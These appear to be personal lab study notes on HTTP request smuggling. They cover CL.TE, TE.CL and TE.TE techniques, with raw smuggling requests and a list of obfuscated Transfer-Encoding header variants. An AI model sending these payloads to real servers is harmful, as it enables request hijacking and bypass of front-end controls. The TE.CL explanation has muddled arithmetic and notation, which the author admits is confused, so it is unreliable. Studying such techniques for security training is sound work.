## How To
* Place both headers in the request and manipulate
* Different situations (listed)
* Need to include \r\n\r\n following the final 0

CE.TE
* Front-end use Content-Length, Back-end use Transfer Encoding
* Front-end will check for length
* Back End will look at the chunks -> terminate request with a 0 length chunk, and throw a smuggled request underneath and it will be taken as a new request.
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
* The above will send a GPOST request (lol)

TE.CL
* Front-end use Transfer Encoding, Back-end use Content-Length
* TE will process first chunk number, not the value, so the smuggled value isn't processed by either front or back end.
* Change Content-Length to first size +2 (because ‘num’ + ‘/’ + ‘n’ = 3)

POST / HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked

8 <- size of rest of request, written as hex if you want (including /n and not the 0)
SMUGGLED
0
* Still much confusion with this one ......

TE.TE
* Front & Back end support Transfer Encoding, but one server can be induced not to process it by obfuscating the header
* try variations of these:
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked

